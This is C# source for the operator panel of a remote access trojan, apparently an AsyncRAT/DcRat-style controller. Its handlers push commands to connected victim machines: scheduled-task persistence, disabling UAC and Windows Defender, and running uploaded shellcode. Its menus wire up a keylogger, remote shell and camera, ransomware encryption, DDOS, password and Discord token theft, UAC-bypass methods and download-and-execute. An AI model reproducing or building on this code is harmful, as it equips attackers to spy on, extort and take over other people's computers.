			listViewItem.ToolTipText = Guid.NewGuid().ToString();
			if (listView4.Items.Count > 0)
			{
				foreach (ListViewItem item in listView4.Items)
				{
					if (item.Text == listViewItem.Text)
					{
						return;
					}
				}
			}
			Program.form1.listView4.Items.Add(listViewItem);
			Program.form1.listView4.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize);
			getTasks.Add(new AsyncTask(msgPack2.Encode2Bytes(), listViewItem.ToolTipText, _admin: false));
		}
		catch (Exception ex)
		{
			MessageBox.Show(ex.Message);
		}
	}

	private void installSchtaskToolStripMenuItem_Click(object sender, EventArgs e)
	{
		try
		{
			MsgPack msgPack = new MsgPack();
			msgPack.ForcePathObject("Pac_ket").AsString = "autoschtaskinstall";
			MsgPack msgPack2 = new MsgPack();
			msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
			msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("bin\\Options.dll");
			msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
			ListViewItem listViewItem = new ListViewItem();
			listViewItem.Text = "InstallSchtask:";
			listViewItem.SubItems.Add("0");
			listViewItem.ToolTipText = Guid.NewGuid().ToString();
			if (listView4.Items.Count > 0)
			{
				foreach (ListViewItem item in listView4.Items)
				{
					if (item.Text == listViewItem.Text)
					{
						return;
					}
				}
			}
			Program.form1.listView4.Items.Add(listViewItem);
			Program.form1.listView4.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize);
			getTasks.Add(new AsyncTask(msgPack2.Encode2Bytes(), listViewItem.ToolTipText, _admin: false));
		}
		catch (Exception ex)
		{
			MessageBox.Show(ex.Message);
		}
	}

	private void disableUACToolStripMenuItem1_Click(object sender, EventArgs e)
	{
		try
		{
			MsgPack msgPack = new MsgPack();
			msgPack.ForcePathObject("Pac_ket").AsString = "disableUAC";
			MsgPack msgPack2 = new MsgPack();
			msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
			msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("bin\\Extra.dll");
			msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
			ListViewItem listViewItem = new ListViewItem();
			listViewItem.Text = "DisableUAC:";
			listViewItem.SubItems.Add("0");
			listViewItem.ToolTipText = Guid.NewGuid().ToString();
			if (listView4.Items.Count > 0)
			{
				foreach (ListViewItem item in listView4.Items)
				{
					if (item.Text == listViewItem.Text)
					{
						return;
					}
				}
			}
			Program.form1.listView4.Items.Add(listViewItem);
			Program.form1.listView4.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize);
			getTasks.Add(new AsyncTask(msgPack2.Encode2Bytes(), listViewItem.ToolTipText, _admin: true));
		}
		catch (Exception ex)
		{
			MessageBox.Show(ex.Message);
		}
	}

	private void disableWDToolStripMenuItem1_Click(object sender, EventArgs e)
	{
		try
		{
			MsgPack msgPack = new MsgPack();
			msgPack.ForcePathObject("Pac_ket").AsString = "disableDefedner";
			MsgPack msgPack2 = new MsgPack();
			msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
			msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("bin\\Extra.dll");
			msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
			ListViewItem listViewItem = new ListViewItem();
			listViewItem.Text = "DisableDefedner:";
			listViewItem.SubItems.Add("0");
			listViewItem.ToolTipText = Guid.NewGuid().ToString();
			if (listView4.Items.Count > 0)
			{
				foreach (ListViewItem item in listView4.Items)
				{
					if (item.Text == listViewItem.Text)
					{
						return;
					}
				}
			}
			Program.form1.listView4.Items.Add(listViewItem);
			Program.form1.listView4.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize);
			getTasks.Add(new AsyncTask(msgPack2.Encode2Bytes(), listViewItem.ToolTipText, _admin: true));
		}
		catch (Exception ex)
		{
			MessageBox.Show(ex.Message);
		}
	}

	private void ConnectTimeout_Tick(object sender, EventArgs e)
	{
		Clients[] allClients = GetAllClients();
		if (allClients.Length == 0)
		{
			return;
		}
		Clients[] array = allClients;
		foreach (Clients clients in array)
		{
			if (Methods.DiffSeconds(clients.LastPing, DateTime.Now) > 20.0)
			{
				clients.Disconnected();
			}
		}
	}

	private void remoteRegeditToolStripMenuItem_Click(object sender, EventArgs e)
	{
		try
		{
			MsgPack msgPack = new MsgPack();
			msgPack.ForcePathObject("Pac_ket").AsString = "plu_gin";
			msgPack.ForcePathObject("Dll").AsString = GetHash.GetChecksum("bin\\Regedit.dll");
			Clients[] selectedClients = GetSelectedClients();
			foreach (Clients clients in selectedClients)
			{
				if ((FormRegistryEditor)Application.OpenForms["remoteRegedit:" + clients.ID] == null)
				{
					FormRegistryEditor formRegistryEditor = new FormRegistryEditor();
					formRegistryEditor.Name = "remoteRegedit:" + clients.ID;
					formRegistryEditor.Text = "remoteRegedit:" + clients.ID;
					formRegistryEditor.ParentClient = clients;
					formRegistryEditor.F = this;
					formRegistryEditor.Show();
					ThreadPool.QueueUserWorkItem(clients.Send, msgPack.Encode2Bytes());
				}
			}
		}
		catch (Exception ex)
		{
			MessageBox.Show(ex.Message);
		}
	}

	private void normalInstallToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (listView1.SelectedItems.Count <= 0)
		{
			return;
		}
		try
		{
			MsgPack msgPack = new MsgPack();
			msgPack.ForcePathObject("Pac_ket").AsString = "normalinstall";
			MsgPack msgPack2 = new MsgPack();
			msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
			msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("bin\\Options.dll");
			msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
			Clients[] selectedClients = GetSelectedClients();
			for (int i = 0; i < selectedClients.Length; i++)
			{
				ThreadPool.QueueUserWorkItem(selectedClients[i].Send, msgPack2.Encode2Bytes());
			}
		}
		catch (Exception ex)
		{
			MessageBox.Show(ex.Message);
		}
	}

	private void normalUninstallToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (listView1.SelectedItems.Count <= 0)
		{
			return;
		}
		try
		{
			MsgPack msgPack = new MsgPack();
			msgPack.ForcePathObject("Pac_ket").AsString = "normaluninstall";
			MsgPack msgPack2 = new MsgPack();
			msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
			msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("bin\\Options.dll");
			msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
			Clients[] selectedClients = GetSelectedClients();
			for (int i = 0; i < selectedClients.Length; i++)
			{
				ThreadPool.QueueUserWorkItem(selectedClients[i].Send, msgPack2.Encode2Bytes());
			}
		}
		catch (Exception ex)
		{
			MessageBox.Show(ex.Message);
		}
	}

	private void justForFunToolStripMenuItem_Click(object sender, EventArgs e)
	{
		try
		{
			MsgPack msgPack = new MsgPack();
			msgPack.ForcePathObject("Pac_ket").AsString = "plu_gin";
			msgPack.ForcePathObject("Dll").AsString = GetHash.GetChecksum("bin\\Fun.dll");
			Clients[] selectedClients = GetSelectedClients();
			foreach (Clients clients in selectedClients)
			{
				if ((FormFun)Application.OpenForms["fun:" + clients.ID] == null)
				{
					FormFun formFun = new FormFun();
					formFun.Name = "fun:" + clients.ID;
					formFun.Text = "fun:" + clients.ID;
					formFun.F = this;
					formFun.ParentClient = clients;
					formFun.Show();
					ThreadPool.QueueUserWorkItem(clients.Send, msgPack.Encode2Bytes());
				}
			}
		}
		catch (Exception ex)
		{
			MessageBox.Show(ex.Message);
		}
	}

	private void runShellcodeToolStripMenuItem_Click(object sender, EventArgs e)
	{
		try
		{
			using OpenFileDialog openFileDialog = new OpenFileDialog();
			openFileDialog.Multiselect = false;
			openFileDialog.Filter = "(*.bin)|*.bin";
			if (openFileDialog.ShowDialog() == DialogResult.OK)
			{
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Pac_ket").AsString = "Shellcode";
				msgPack.ForcePathObject("Bin").SetAsBytes(File.ReadAllBytes(openFileDialog.FileName));
				MsgPack msgPack2 = new MsgPack();
				msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
				msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("bin\\Miscellaneous.dll");
				msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
				Clients[] selectedClients = GetSelectedClients();
				for (int i = 0; i < selectedClients.Length; i++)
				{
					ThreadPool.QueueUserWorkItem(selectedClients[i].Send, msgPack2.Encode2Bytes());
				}
			}
		}
		catch (Exception ex)
		{
			MessageBox.Show(ex.Message);
		}
	}

	private void noSystemToolStripMenuItem_Click(object sender, EventArgs e)
	{
		try
		{
			MsgPack msgPack = new MsgPack();
			msgPack.ForcePathObject("Pac_ket").AsString = "nosystem";
			MsgPack msgPack2 = new MsgPack();
			msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
			msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("bin\\Options.dll");
			msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
			Clients[] selectedClients = GetSelectedClients();
			foreach (Clients clients in selectedClients)
			{
				if (clients.LV.SubItems[lv_user.Index].Text.ToLower() == "system")
				{
					ThreadPool.QueueUserWorkItem(clients.Send, msgPack2.Encode2Bytes());
				}
			}
		}
		catch (Exception ex)
		{
			MessageBox.Show(ex.Message);
		}
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		base.Dispose(disposing);
	}

	private void InitializeComponent()
	{
		this.components = new System.ComponentModel.Container();
		System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(Form1));
		this.contextMenuClient = new System.Windows.Forms.ContextMenuStrip(this.components);
		this.RemoteManagerToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.RemoteShellToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.RemoteScreenToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.RemoteCameraToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.remoteRegeditToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.FileManagerToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
		this.ProcessManagerToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.netstatToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.RecordToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.ProgramNotificationToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.StartToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
		this.StopToolStripMenuItem2 = new System.Windows.Forms.ToolStripMenuItem();
		this.RemoteControlToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.SendFileToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
		this.fromUrlToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.SendFileToDiskToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.SendFileToMemoryToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.runShellcodeToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.MessageBoxToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.ChatToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
		this.VisteWebsiteToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
		this.ChangeWallpaperToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
		this.KeyloggerToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
		this.FileSearchToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.MalwareToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.dDOSToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.RansomwareToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.EncryptToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.DecryptToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.DisableWDToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.PasswordRecoveryToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.DiscordRecoveryToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.DisableUACToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.SystemControlToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.ClientControlToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.StopToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
		this.RestartToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
		this.noSystemToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.UpdateToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.UninstallToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.ClientFolderToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.SystemToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.ShutDownToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.RebootToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.LogoutToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.BypassUACAToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.SilentCleanupToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.FodhelperToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.RunasToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.CompMgmtLauncherToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.InstallToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.SchtaskInstallToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.SchtaskUninstallToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.normalInstallToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.normalUninstallToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.justForFunToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.InformationToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.statusStrip1 = new DarkUI.Controls.DarkStatusStrip();
		this.toolStripStatusLabel1 = new System.Windows.Forms.ToolStripStatusLabel();
		this.toolStripStatusLabel2 = new System.Windows.Forms.ToolStripStatusLabel();
		this.ping = new System.Windows.Forms.Timer(this.components);
		this.UpdateUI = new System.Windows.Forms.Timer(this.components);
		this.contextMenuLogs = new System.Windows.Forms.ContextMenuStrip(this.components);
		this.cLEARToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.contextMenuThumbnail = new System.Windows.Forms.ContextMenuStrip(this.components);
		this.sTARTToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.sTOPToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.ThumbnailImageList = new System.Windows.Forms.ImageList(this.components);
		this.contextMenuTasks = new System.Windows.Forms.ContextMenuStrip(this.components);
		this.sendFileFromUrlToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.downloadAndExecuteToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.sENDFILETOMEMORYToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
		this.disableUACToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
		this.disableWDToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
		this.installSchtaskToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.uPDATEToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
		this.autoKeyloggerToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.fakeBinderToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.toolStripSeparator4 = new System.Windows.Forms.ToolStripSeparator();
		this.dELETETASKToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.performanceCounter1 = new System.Diagnostics.PerformanceCounter();
		this.performanceCounter2 = new System.Diagnostics.PerformanceCounter();
		this.notifyIcon1 = new System.Windows.Forms.NotifyIcon(this.components);
		this.TimerTask = new System.Windows.Forms.Timer(this.components);
		this.menuStrip1 = new DarkUI.Controls.DarkMenuStrip();
		this.FileToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.BuilderToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.BlockToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.splitContainer1 = new System.Windows.Forms.SplitContainer();
		this.tabControl1 = new System.Windows.Forms.TabControl();
		this.tabPage1 = new System.Windows.Forms.TabPage();
		this.listView1 = new System.Windows.Forms.ListView();
		this.lv_ip = new System.Windows.Forms.ColumnHeader();
		this.lv_country = new System.Windows.Forms.ColumnHeader();
		this.lv_group = new System.Windows.Forms.ColumnHeader();
		this.lv_hwid = new System.Windows.Forms.ColumnHeader();
		this.lv_user = new System.Windows.Forms.ColumnHeader();
		this.lv_camera = new System.Windows.Forms.ColumnHeader();
		this.lv_os = new System.Windows.Forms.ColumnHeader();
		this.lv_version = new System.Windows.Forms.ColumnHeader();
		this.lv_ins = new System.Windows.Forms.ColumnHeader();
		this.lv_admin = new System.Windows.Forms.ColumnHeader();
		this.lv_av = new System.Windows.Forms.ColumnHeader();
		this.lv_ping = new System.Windows.Forms.ColumnHeader();
		this.lv_act = new System.Windows.Forms.ColumnHeader();
		this.tabPage3 = new System.Windows.Forms.TabPage();
		this.listView3 = new System.Windows.Forms.ListView();
		this.tabPage4 = new System.Windows.Forms.TabPage();
		this.listView4 = new System.Windows.Forms.ListView();
		this.columnHeader4 = new System.Windows.Forms.ColumnHeader();
		this.columnHeader5 = new System.Windows.Forms.ColumnHeader();
		this.ConnectTimeout = new System.Windows.Forms.Timer(this.components);
		this.columnHeader1 = new System.Windows.Forms.ColumnHeader();
		this.columnHeader2 = new System.Windows.Forms.ColumnHeader();
		this.listView2 = new System.Windows.Forms.ListView();
		this.contextMenuClient.SuspendLayout();
		this.statusStrip1.SuspendLayout();
		this.contextMenuLogs.SuspendLayout();
		this.contextMenuThumbnail.SuspendLayout();
		this.contextMenuTasks.SuspendLayout();
		((System.ComponentModel.ISupportInitialize)this.performanceCounter1).BeginInit();
		((System.ComponentModel.ISupportInitialize)this.performanceCounter2).BeginInit();
		this.menuStrip1.SuspendLayout();
		((System.ComponentModel.ISupportInitialize)this.splitContainer1).BeginInit();
		this.splitContainer1.Panel1.SuspendLayout();
		this.splitContainer1.Panel2.SuspendLayout();
		this.splitContainer1.SuspendLayout();
		this.tabControl1.SuspendLayout();
		this.tabPage1.SuspendLayout();
		this.tabPage3.SuspendLayout();
		this.tabPage4.SuspendLayout();
		base.SuspendLayout();
		this.contextMenuClient.Items.AddRange(new System.Windows.Forms.ToolStripItem[8] { this.RemoteManagerToolStripMenuItem, this.RemoteControlToolStripMenuItem, this.MalwareToolStripMenuItem, this.SystemControlToolStripMenuItem, this.BypassUACAToolStripMenuItem, this.InstallToolStripMenuItem, this.justForFunToolStripMenuItem, this.InformationToolStripMenuItem });
		this.contextMenuClient.Name = "contextMenuStrip1";
		this.contextMenuClient.Size = new System.Drawing.Size(156, 180);
		this.RemoteManagerToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[9] { this.RemoteShellToolStripMenuItem, this.RemoteScreenToolStripMenuItem, this.RemoteCameraToolStripMenuItem, this.remoteRegeditToolStripMenuItem, this.FileManagerToolStripMenuItem1, this.ProcessManagerToolStripMenuItem, this.netstatToolStripMenuItem, this.RecordToolStripMenuItem, this.ProgramNotificationToolStripMenuItem });
		this.RemoteManagerToolStripMenuItem.Name = "RemoteManagerToolStripMenuItem";
		this.RemoteManagerToolStripMenuItem.Size = new System.Drawing.Size(155, 22);
		this.RemoteManagerToolStripMenuItem.Text = "Surveillance";
		this.RemoteShellToolStripMenuItem.Name = "RemoteShellToolStripMenuItem";
		this.RemoteShellToolStripMenuItem.Size = new System.Drawing.Size(186, 22);
		this.RemoteShellToolStripMenuItem.Text = "Remote Shell";
		this.RemoteShellToolStripMenuItem.Click += new System.EventHandler(RemoteShellToolStripMenuItem_Click);
		this.RemoteScreenToolStripMenuItem.Name = "RemoteScreenToolStripMenuItem";
		this.RemoteScreenToolStripMenuItem.Size = new System.Drawing.Size(186, 22);
		this.RemoteScreenToolStripMenuItem.Text = "Remote Screen";
		this.RemoteScreenToolStripMenuItem.Click += new System.EventHandler(RemoteScreenToolStripMenuItem_Click);
		this.RemoteCameraToolStripMenuItem.Name = "RemoteCameraToolStripMenuItem";
		this.RemoteCameraToolStripMenuItem.Size = new System.Drawing.Size(186, 22);
		this.RemoteCameraToolStripMenuItem.Text = "Remote Camera";
		this.RemoteCameraToolStripMenuItem.Click += new System.EventHandler(RemoteCameraToolStripMenuItem_Click);
		this.remoteRegeditToolStripMenuItem.Name = "remoteRegeditToolStripMenuItem";
		this.remoteRegeditToolStripMenuItem.Size = new System.Drawing.Size(186, 22);
		this.FileManagerToolStripMenuItem1.Name = "FileManagerToolStripMenuItem1";
		this.FileManagerToolStripMenuItem1.Size = new System.Drawing.Size(186, 22);
		this.FileManagerToolStripMenuItem1.Text = "File Manager";
		this.FileManagerToolStripMenuItem1.Click += new System.EventHandler(FileManagerToolStripMenuItem1_Click);
		this.ProcessManagerToolStripMenuItem.Name = "ProcessManagerToolStripMenuItem";
		this.ProcessManagerToolStripMenuItem.Size = new System.Drawing.Size(186, 22);
		this.ProcessManagerToolStripMenuItem.Text = "Process Manager";
		this.ProcessManagerToolStripMenuItem.Click += new System.EventHandler(ProcessManagerToolStripMenuItem_Click);
		this.netstatToolStripMenuItem.Name = "netstatToolStripMenuItem";
		this.netstatToolStripMenuItem.Size = new System.Drawing.Size(186, 22);
		this.netstatToolStripMenuItem.Text = "Netstat";
		this.netstatToolStripMenuItem.Click += new System.EventHandler(netstatToolStripMenuItem_Click);
		this.RecordToolStripMenuItem.Name = "RecordToolStripMenuItem";
		this.RecordToolStripMenuItem.Size = new System.Drawing.Size(186, 22);
		this.RecordToolStripMenuItem.Text = "Record";
		this.RecordToolStripMenuItem.Click += new System.EventHandler(RecordToolStripMenuItem_Click);
		this.ProgramNotificationToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[2] { this.StartToolStripMenuItem1, this.StopToolStripMenuItem2 });
		this.ProgramNotificationToolStripMenuItem.Name = "ProgramNotificationToolStripMenuItem";
		this.ProgramNotificationToolStripMenuItem.Size = new System.Drawing.Size(186, 22);
		this.ProgramNotificationToolStripMenuItem.Text = "Program Notification";
		this.StartToolStripMenuItem1.Name = "StartToolStripMenuItem1";
		this.StartToolStripMenuItem1.Size = new System.Drawing.Size(98, 22);
		this.StartToolStripMenuItem1.Text = "Start";
		this.StartToolStripMenuItem1.Click += new System.EventHandler(StartToolStripMenuItem1_Click);
		this.StopToolStripMenuItem2.Name = "StopToolStripMenuItem2";
		this.StopToolStripMenuItem2.Size = new System.Drawing.Size(98, 22);
		this.StopToolStripMenuItem2.Text = "Stop";
		this.StopToolStripMenuItem2.Click += new System.EventHandler(StopToolStripMenuItem2_Click);
		this.RemoteControlToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[8] { this.SendFileToolStripMenuItem1, this.runShellcodeToolStripMenuItem, this.MessageBoxToolStripMenuItem, this.ChatToolStripMenuItem1, this.VisteWebsiteToolStripMenuItem1, this.ChangeWallpaperToolStripMenuItem1, this.KeyloggerToolStripMenuItem1, this.FileSearchToolStripMenuItem });
		this.RemoteControlToolStripMenuItem.Name = "RemoteControlToolStripMenuItem";
		this.RemoteControlToolStripMenuItem.Size = new System.Drawing.Size(155, 22);
		this.RemoteControlToolStripMenuItem.Text = "Control";
		this.SendFileToolStripMenuItem1.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[3] { this.fromUrlToolStripMenuItem, this.SendFileToDiskToolStripMenuItem, this.SendFileToMemoryToolStripMenuItem });
		this.SendFileToolStripMenuItem1.Name = "SendFileToolStripMenuItem1";
		this.SendFileToolStripMenuItem1.Size = new System.Drawing.Size(171, 22);
		this.SendFileToolStripMenuItem1.Text = "Send File";
		this.fromUrlToolStripMenuItem.Name = "fromUrlToolStripMenuItem";
		this.fromUrlToolStripMenuItem.Size = new System.Drawing.Size(184, 22);
		this.fromUrlToolStripMenuItem.Text = "From Url";
		this.fromUrlToolStripMenuItem.Click += new System.EventHandler(fromUrlToolStripMenuItem_Click);
		this.SendFileToDiskToolStripMenuItem.Name = "SendFileToDiskToolStripMenuItem";
		this.SendFileToDiskToolStripMenuItem.Size = new System.Drawing.Size(184, 22);
		this.SendFileToDiskToolStripMenuItem.Text = "Send File To Disk";
		this.SendFileToDiskToolStripMenuItem.Click += new System.EventHandler(SendFileToDiskToolStripMenuItem_Click);
		this.SendFileToMemoryToolStripMenuItem.Name = "SendFileToMemoryToolStripMenuItem";
		this.SendFileToMemoryToolStripMenuItem.Size = new System.Drawing.Size(184, 22);
		this.SendFileToMemoryToolStripMenuItem.Text = "Send File To Memory";
		this.SendFileToMemoryToolStripMenuItem.Click += new System.EventHandler(SendFileToMemoryToolStripMenuItem_Click);
		this.runShellcodeToolStripMenuItem.Name = "runShellcodeToolStripMenuItem";
		this.runShellcodeToolStripMenuItem.Size = new System.Drawing.Size(171, 22);
		this.runShellcodeToolStripMenuItem.Text = "Run Shellcode";
		this.runShellcodeToolStripMenuItem.Click += new System.EventHandler(runShellcodeToolStripMenuItem_Click);
		this.MessageBoxToolStripMenuItem.Name = "MessageBoxToolStripMenuItem";
		this.MessageBoxToolStripMenuItem.Size = new System.Drawing.Size(171, 22);
		this.MessageBoxToolStripMenuItem.Text = "MessageBox";
		this.MessageBoxToolStripMenuItem.Click += new System.EventHandler(MessageBoxToolStripMenuItem_Click);
		this.VisteWebsiteToolStripMenuItem1.Name = "VisteWebsiteToolStripMenuItem1";
		this.VisteWebsiteToolStripMenuItem1.Size = new System.Drawing.Size(171, 22);
		this.VisteWebsiteToolStripMenuItem1.Text = "Viste Website";
		this.VisteWebsiteToolStripMenuItem1.Click += new System.EventHandler(VisteWebsiteToolStripMenuItem1_Click);
		this.ChangeWallpaperToolStripMenuItem1.Name = "ChangeWallpaperToolStripMenuItem1";
		this.ChangeWallpaperToolStripMenuItem1.Size = new System.Drawing.Size(171, 22);
		this.ChangeWallpaperToolStripMenuItem1.Text = "Change Wallpaper";
		this.ChangeWallpaperToolStripMenuItem1.Click += new System.EventHandler(ChangeWallpaperToolStripMenuItem1_Click);
		this.KeyloggerToolStripMenuItem1.Name = "KeyloggerToolStripMenuItem1";
		this.KeyloggerToolStripMenuItem1.Size = new System.Drawing.Size(171, 22);
		this.KeyloggerToolStripMenuItem1.Text = "Keylogger";
		this.KeyloggerToolStripMenuItem1.Click += new System.EventHandler(KeyloggerToolStripMenuItem1_Click);
		this.FileSearchToolStripMenuItem.Name = "FileSearchToolStripMenuItem";
		this.FileSearchToolStripMenuItem.Size = new System.Drawing.Size(171, 22);
		this.FileSearchToolStripMenuItem.Text = "File Search";
		this.FileSearchToolStripMenuItem.Click += new System.EventHandler(FileSearchToolStripMenuItem_Click);
		this.MalwareToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[6] { this.dDOSToolStripMenuItem, this.RansomwareToolStripMenuItem, this.DisableWDToolStripMenuItem, this.PasswordRecoveryToolStripMenuItem, this.DiscordRecoveryToolStripMenuItem, this.DisableUACToolStripMenuItem });
		this.MalwareToolStripMenuItem.Name = "MalwareToolStripMenuItem";
		this.MalwareToolStripMenuItem.Size = new System.Drawing.Size(155, 22);
		this.MalwareToolStripMenuItem.Text = "Malware";
		this.dDOSToolStripMenuItem.Name = "dDOSToolStripMenuItem";
		this.dDOSToolStripMenuItem.Size = new System.Drawing.Size(175, 22);
		this.dDOSToolStripMenuItem.Text = "DDOS";
		this.dDOSToolStripMenuItem.Click += new System.EventHandler(dDOSToolStripMenuItem_Click);
		this.RansomwareToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[2] { this.EncryptToolStripMenuItem, this.DecryptToolStripMenuItem });
		this.RansomwareToolStripMenuItem.Name = "RansomwareToolStripMenuItem";
		this.RansomwareToolStripMenuItem.Size = new System.Drawing.Size(175, 22);
		this.RansomwareToolStripMenuItem.Text = "Ransomware";
		this.EncryptToolStripMenuItem.Name = "EncryptToolStripMenuItem";
		this.EncryptToolStripMenuItem.Size = new System.Drawing.Size(115, 22);
		this.EncryptToolStripMenuItem.Text = "Encrypt";
		this.EncryptToolStripMenuItem.Click += new System.EventHandler(EncryptToolStripMenuItem_Click);
		this.DecryptToolStripMenuItem.Name = "DecryptToolStripMenuItem";
		this.DecryptToolStripMenuItem.Size = new System.Drawing.Size(115, 22);
		this.DecryptToolStripMenuItem.Text = "Decrypt";
		this.DecryptToolStripMenuItem.Click += new System.EventHandler(DecryptToolStripMenuItem_Click);
		this.DisableWDToolStripMenuItem.Name = "DisableWDToolStripMenuItem";
		this.DisableWDToolStripMenuItem.Size = new System.Drawing.Size(175, 22);
		this.DisableWDToolStripMenuItem.Text = "Disable WD";
		this.DisableWDToolStripMenuItem.Click += new System.EventHandler(DisableWDToolStripMenuItem_Click);
